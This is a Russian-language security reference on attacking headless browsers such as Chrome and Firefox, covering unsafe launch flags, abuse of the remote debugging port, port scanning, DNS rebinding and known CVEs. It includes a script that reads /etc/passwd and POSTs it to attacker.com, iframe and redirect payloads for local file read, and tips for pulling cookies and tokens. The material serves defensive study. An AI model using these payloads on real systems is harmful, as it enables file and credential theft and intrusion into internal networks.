**Безголовый браузер (Headless Browser)**

Безголовый браузер — это веб-браузер без графического интерфейса пользователя. Он работает так же, как обычный браузер (например, Chrome или Firefox), интерпретируя HTML, CSS и JavaScript, но делает это в фоновом режиме, не отображая никакой визуальной информации. Безголовые браузеры в основном используются для автоматизированных задач, таких как веб-скрапинг, тестирование и выполнение скриптов. Они особенно полезны в ситуациях, когда не нужен полнофункциональный браузер или когда ресурсы (например, память или процессор) ограничены.

**Содержание**

*   **Команды для безголовых браузеров**
*   **Чтение локальных файлов (Local File Read)**
*   **Порт удаленной отладки (Remote Debugging Port)**
*   **Сеть**
    *   Сканирование портов
    *   DNS-перепривязка (DNS Rebinding)
*   **CVE (известные уязвимости)**
*   **Ссылки**

**Команды для безголовых браузеров**

Примеры команд для запуска безголовых браузеров:

**Google Chrome**

```bash
google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com
```

**Mozilla Firefox**

```bash
firefox --screenshot https://www.google.com
```

**Microsoft Edge**

```bash
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu --window-size=1280,720 --screenshot="C:\tmp\screen.png" "https://google.com"
```

**Чтение локальных файлов**

**Небезопасные флаги**

Если целевой браузер запущен с опцией `--allow-file-access` (или связанными с ней), злоумышленник может прочитать локальные файлы.

Пример запуска с небезопасными флагами:

```bash
google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run --disable-web-security --allow-file-access-from-files --allow-file-access --allow-cross-origin-auth-prompt --user-data-dir
```

Поскольку доступ к файлам разрешен, атакующий может создать и предоставить HTML-файл, который захватывает содержимое, например, `/etc/passwd`.

```html
<script>
  async function getFlag(){
    response = await fetch("file:///etc/passwd");
    flag = await response.text();
    fetch("https://attacker.com/", { method: "POST", body: flag})
  };
  getFlag();
</script>
```

**Рендеринг в PDF**

Рассмотрим сценарий, где безголовый браузер создает копию веб-страницы и экспортирует ее в PDF, при этом атакующий контролирует обрабатываемый URL.

Цель: `google-chrome-stable --headless[=(new|old)] --print-to-pdf https://site/file.html`

**Перенаправление через JavaScript (Javascript Redirect)**

```html
<html>
    <body>
        <script>
            window.location="/etc/passwd"
        </script>
    </body>
</html>
```

**Использование Iframe**

```html
<html>
    <body>
        <iframe src="/etc/passwd" height="640" width="640"></iframe>
    </body>
</html>
```

**Порт удаленной отладки (Remote Debugging Port)**

Порт удаленной отладки в безголовом браузере (например, Headless Chrome или Chromium) — это TCP-порт, который открывает протокол инструментов разработчика браузера (DevTools Protocol), позволяя внешним инструментам (или скриптам) подключаться и управлять браузером удаленно. Обычно он слушает порт 9222, но его можно изменить с помощью флага `--remote-debugging-port=`.

Цель: `google-chrome-stable --headless=new --remote-debugging-port=XXXX ./index.html`

**Инструменты для работы с портом отладки:**

*   **slyd0g/WhiteChocolateMacademiaNut** — инструмент для взаимодействия с портом отладки браузеров на базе Chromium для просмотра открытых вкладок, установленных расширений и cookie.
*   **slyd0g/ripWCMN.py** — альтернатива WCMN на Python, исправляющая проблему подключения к websocket с пустым заголовком Origin.

**Примечание:** Начиная с обновления Chrome от 20 декабря 2022 года, для подключения к websocket с помощью WhiteChocolateMacademiaNut необходимо запускать браузер с аргументом `--remote-allow-origins="*"`.

**Примеры эксплуатации:**

*   **Подключение и взаимодействие с браузером:** можно использовать `chrome://inspect/#devices` или `opera://inspect/#devices`.
*   **Восстановление сессии:** Можно завершить текущий запущенный браузер и использовать флаг `--restore-last-session` для получения доступа к вкладкам пользователя.
*   **Данные в настройках:** Имена пользователей, пароли, токены могут быть доступны по адресу `chrome://settings`.
*   **Сканирование портов:** В цикле открывать `http://localhost:<port>/json/new?http://callback.example.com?port=<port>`.
*   **Утечка UUID:** Использовать iframe: `http://127.0.0.1:<port>/json/version`

    Пример ответа от `/json/version`:

    ```json
    {
        "Browser": "Chrome/136.0.7103.113",
        "Protocol-Version": "1.3",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.0.0 Safari/537.36",
        "V8-Version": "13.6.233.10",
        "WebKit-Version": "537.36 (@76fa3c1782406c63308c70b54f228fd39c7aaa71)",
        "webSocketDebuggerUrl": "ws://127.0.0.1:9222/devtools/browser/d815e18d-57e6-4274-a307-98649a9e6b87"
    }
    ```

*   **Чтение локальных файлов:** Можно использовать инструмент pich4ya/chrome_remote_debug_lfi.py.

**Node.js Inspector**

Инспектор Node.js (`--inspect`) работает аналогично `--remote-debugging-port`.

```bash
node --inspect app.js # порт по умолчанию 9229
node --inspect=4444 app.js # пользовательский порт 4444
node --inspect=0.0.0.0:4444 app.js
```

**Важное замечание о новых версиях Chrome:**

Начиная с Chrome 136, флаги `--remote-debugging-port` и `--remote-debugging-pipe` не будут работать при попытке отладки стандартного каталога данных Chrome. Теперь эти флаги должны сопровождаться флагом `--user-data-dir`, указывающим на нестандартный каталог.

Флаг `--user-data-dir=/path/to/data_dir` используется для указания каталога данных пользователя, где Chromium хранит все данные приложения, такие как cookie и историю. Если запустить Chromium без этого флага, закладки, избранное или история не будут загружены.

**Сеть**

**Сканирование портов (Port Scanning)**

Техника сканирования портов, основанная на измерении времени (Timing attack):

1.  Динамически вставить тег `<img>`, указывающий на гипотетически закрытый порт. Измерить время до срабатывания `onerror`.
2.  Повторить не менее 10 раз → получить среднее время получения ошибки для закрытого порта.
3.  Протестировать случайный порт 10 раз и измерить время до ошибки.
4.  Если `время_до_ошибки(случайный_порт)` > `среднее_время_закрытого_порта * 1.3`, то порт считается открытым.

**Важные соображения:**

*   Chrome по умолчанию блокирует список "известных портов".
*   Chrome блокирует доступ к адресам локальной сети, кроме localhost, через `0.0.0.0`.

**DNS-перепривязка (DNS Rebinding)**

*   **nccgroup/singularity** — фреймворк для атак с использованием DNS-перепривязки.

**Как это может работать против браузера:**

1.  Chrome выполнит 2 DNS-запроса: для A и AAAA записей.
2.  Атакующий отправляет:
    *   Ответ AAAA с легитимным внешним IP (интернет).
    *   Ответ A с внутренним IP (например, 192.168.1.1).
3.  Chrome сначала попытается подключиться по IPv6 (к внешнему `evil.net`).
4.  Атакующий закрывает IPv6-слушатель сразу после первого ответа.
5.  Открывается Iframe на `evil.net`.
6.  Chrome попытается подключиться по IPv6, но, потерпев неудачу, переключится на IPv4 (на внутренний IP).
7.  Из главного окна можно внедрить скрипт в iframe для извлечения содержимого с внутреннего ресурса.

**CVE (известные уязвимости)**

Эксплуатация безголового браузера с использованием известной уязвимости (CVE) включает несколько этапов: от исследования уязвимости до выполнения полезной нагрузки. Ниже представлена структурированная схема процесса:

1.  **Идентификация:** Определить безголовый браузер по User-Agent.
2.  **Выбор цели:** Выбрать эксплойт, нацеленный на компонент браузера: движок V8, рендерер Blink, Webkit и т.д.

**Примеры CVE:**

*   **Chrome CVE:**
    *   `CVE-2024-9122` — путаница типов (type confusion) в WASM из-за импортированных сигнатур тегов.
    *   `CVE-2025-5419` — чтение и запись за пределами границ буфера (out of bounds read/write) в V8.
*   **Firefox:**
    *   `CVE-2024-9680` — использование после освобождения (use after free).

**Флаг `--no-sandbox`:**

Опция `--no-sandbox` отключает функцию песочницы (sandbox) для процесса рендеринга, что значительно повышает шансы на успешную эксплуатацию многих уязвимостей.

Пример в коде с использованием Puppeteer:

```javascript
const browser = await puppeteer.launch({
    args: ['--no-sandbox']
});
```
